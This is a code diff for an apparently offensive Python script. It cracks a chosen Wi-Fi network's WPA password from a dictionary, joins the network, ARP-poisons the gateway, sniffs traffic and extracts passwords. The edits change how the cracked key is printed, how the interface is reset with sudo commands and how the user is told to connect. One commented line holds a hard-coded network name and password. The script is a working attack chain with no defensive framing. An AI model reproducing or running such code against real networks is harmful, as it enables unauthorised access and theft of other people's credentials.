@@ -15,11 +15,16 @@ def crackWPA(essid, dictFile):
     with open(WIFITE_PASSWORDS_FILE, "r") as passwords:
         for line in passwords.readlines():
             if '"key":' in line:
-                print(line.split()[-1][1:-2])
+                print("Password for network {} is {}\n\n".format(essid,line.split()[-1][1:-2]))
                 return line.split()[-1][1:-2]
 
 def connectToNetwork(essid, password):
-    subprocess.Popen(["nmcli", "d", "wifi", "connect", essid, "password", password], stdout=subprocess.PIPE, stderr=subprocess.PIPE).wait()
+    print("connecting to network")
+    os.system("sudo ifconfig {} down".format(INTERFACE_NAME))
+    os.system("sudo iwconfig {} mode managed".format(INTERFACE_NAME))
+    os.system("sudo ifconfig {} up".format(INTERFACE_NAME))
+    #os.system("sudo nmcli d wifi connect Vic password praetorian")
+    #subprocess.Popen(["sudo", "nmcli", "d", "wifi", "connect", essid, "password", password]).wait()
 
 def getGatewayIP():
     with subprocess.Popen(["ip", "route"], stdout=subprocess.PIPE) as proc:
@@ -46,8 +51,9 @@ if __name__ == "__main__":
     essid = input("Enter the name of the network you'd like to attack:")
     password = crackWPA(essid, DICT_FILE)
     connectToNetwork(essid, password)
+    input("Please connect to the network using the password. You can connect in your network settings or run this command in another terminal:\n nmcli d wifi connect \"{}\" password {}\nPress enter once you are connected.".format(essid, password))
     gatewayIP = getGatewayIP()
-    arpSpoofProc = arpPoison(monitorModeInterface, gatewayIP)
+    arpSpoofProc = arpPoison(INTERFACE_NAME, gatewayIP)
     sniffTraffic()
     parsePasswords()
     arpSpoofProc.terminate()
